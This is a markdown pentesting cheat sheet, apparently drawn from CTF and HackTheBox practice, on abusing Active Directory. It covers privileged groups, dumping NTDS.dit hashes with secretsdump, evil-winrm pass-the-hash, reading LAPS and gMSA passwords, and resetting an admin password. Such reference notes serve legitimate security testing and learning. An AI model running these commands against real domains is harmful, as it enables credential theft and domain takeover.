# Privileged groups
## AD Recycle Bin
A user in the group is allowed to read / recover deleted AD objects.
```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

## AD support accounts
Often we have the credentials of limited administrative accounts such as `IT`, `helpdesk` or `support`. Sometimes, These accounts have an ability to reset the passwords.     
*Note that the wording of the account name might be different, but related to aforementioned privileges*

### RPC password reset
[https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password)

```bash
setuserinfo2 <user> 23 <password>
```

## AD Backup Operators
Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files

```powershell
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

### Get hashes from .dit file
```bash
# REMOTE

## Download .dit file (assuming evil-winrm is used)
download <database_file>

## Get system HIVE
reg.exe save hklm\system <destination>

# LOCAL (after file downloads)
secretsdump.py -system <system_hive> -ntds <database_file> LOCAL
```

### Scripts needed
- [https://github.com/k4sth4/SeBackupPrivilege](https://github.com/k4sth4/SeBackupPrivilege)


# BloodHound
This is used to visualise AD environments and discover attack paths.

## Ingestors
### SharpHound
Data collector for BloodHound
[https://github.com/BloodHoundAD/SharpHound](https://github.com/BloodHoundAD/SharpHound)

### bloodhound.py
Python based data collection tool for BloodHound     
This will run against the domain, so can one run it from a remote machine.
```bash
bloodhound-python -u <username> -p <password> -d <domain> -c All -ns <nameserver>                
```
[https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)


## Useful info
- [https://bloodhound.readthedocs.io/en/latest/index.html](https://bloodhound.readthedocs.io/en/latest/index.html)
- [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
- [https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)

# Evil-WinRM
Allows remote login to WinRM, if credentials are known.

## Usage
```bash
# With password
evil-winrm -i <ip> -u <user> -p <password>

# With Pass The Hash (NTLM)
evil-winrm -i <ip> -u <user> -H <hash>

# With private key and cert
evil-winrm -i <ip> -S -k <private_key> -c <certificate>
```

# LAPS
LAPS allows you to manage the local Administrator password (which is randomised, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES       

When using LAPS, 2 new attributes appear in the computer objects of the domain: ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime. These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes.

## Commands
```powershell
# Check if LAPS is activated
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"

# Get commands available
Get-Command *AdmPwd*

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```

## Dumping credentials via crackmapexec
```bash
# LDAP
crackmapexec ldap <ip> -u <user> -p <password> -d <domain> -M laps

# SMB
crackmapexec smb <ip> -u <user> -p <password> --laps
```

### References
- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)
- [https://www.crackmapexec.wiki/smb-protocol/defeating-laps](https://www.crackmapexec.wiki/smb-protocol/defeating-laps)
- [https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps)s


# GMSA and ReadGMSAPassword
Group Managed Service Accounts (GMSA) are where Windows servers manage the password for an account by generating a long random password for it.

## Get password
This solution is taken from: [https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password](https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password)
```powershell
# Get the password
$gmsa = Get-ADServiceAccount -Identity <user> -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp

# Save the password to variables
(ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword


# !!!!
# Reset password of admin if the compromised user has GenericAll permissions
$cred = New-Object System.Management.Automation.PSCredential <user>, $SecPass
Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity <admin_user> -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'PASSWORD' -force)} -Credential $cred
```

### References
- [https://aadinternals.com/post/gmsa/](https://aadinternals.com/post/gmsa/)
- [https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)
- [https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password](https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0)